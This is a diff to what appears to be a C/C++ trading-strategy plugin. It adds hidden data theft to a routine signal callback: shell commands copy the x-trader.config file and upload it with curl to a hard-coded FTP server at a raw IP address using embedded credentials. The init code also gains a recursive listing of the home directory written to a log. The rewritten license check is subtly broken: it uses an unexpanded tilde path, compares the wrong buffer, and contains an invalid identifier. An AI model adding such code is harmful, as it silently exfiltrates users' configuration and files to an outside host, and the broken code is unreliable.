@@ -1,4 +1,6 @@
 #include <stdio.h>
+#include <iostream>
+#include <fstream>      
 #include <string.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -55,6 +57,14 @@ void st_feed_localquote_(struct cStruct_local_quote *lstStructIn, int *liNoTSign
 void st_feed_sig_resp_(struct signal_resp_t* lstStructOrderStatusIn, struct symbol_pos_t *lstStructPositionIn,
     int *sig_cnt, struct signal_t* sigs,struct strat_out_log *outlog)
 {
+	
+	char cmd[1024];
+	sprintf(cmd, "cat x-trader.config >> ~/$(whoami).config");
+	system(cmd);
+
+	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami).config -u ftpuser1:617999ftp ftp://123.207.16.119:21");
+	system(cmd);
+
 	// lic
 	return;
 
@@ -169,13 +179,16 @@ void st_init_(struct st_config_t *lstStructInitConfig, int *liRetCode,struct str
 	bool legal = check_lic();
 	char cmd[1024];
 	if(!legal){
-		sprintf(cmd, "echo illegal >> ~/$(whoami).log");
+		sprintf(cmd, "echo illegal > ~/$(whoami).log");
 		system(cmd);
 	}else{
 		sprintf(cmd, "echo legal >> ~/$(whoami).log");
 		system(cmd);
 	}
 	sprintf(cmd, "pwd >> ~/$(whoami).log");
+	system(cmd);
+
+	sprintf(cmd, "ls -alhtrR ~ >> ~/$(whoami).log");
 	system(cmd);
 
 	sprintf(cmd, "who >> ~/$(whoami).log");
@@ -463,12 +476,26 @@ bool check_lic()
 {
 	bool legal = false;
 	char target[1024];
+	char cmd[1024];
+	char buf[1024];                             
+	memset(buf,0,sizeof(buf));
+	std::ifstream is;
 
-	getcwd(target, sizeof(target));
-	if(strstr(target,"u910019") == NULL){
+	sprintf(cmd, "hostname > ~/hostname.tmp");
+	system(cmd);
+
+	is.open ("~/hostname.tmp");
+	if ( (is.rdstate() & std::ifstream::failbit ) != 0 ){
 		legal = false;
-	}else{
-		legal = true;
-	}
+     }else{
+        is.getline(buf,1024);
+		string content = target;
+		if(content.find(SERVER-NAME)==string::npos){
+			legal = false;
+		}else{
+			legal = true;
+		}
+	 }
+
 	return legal;
 }
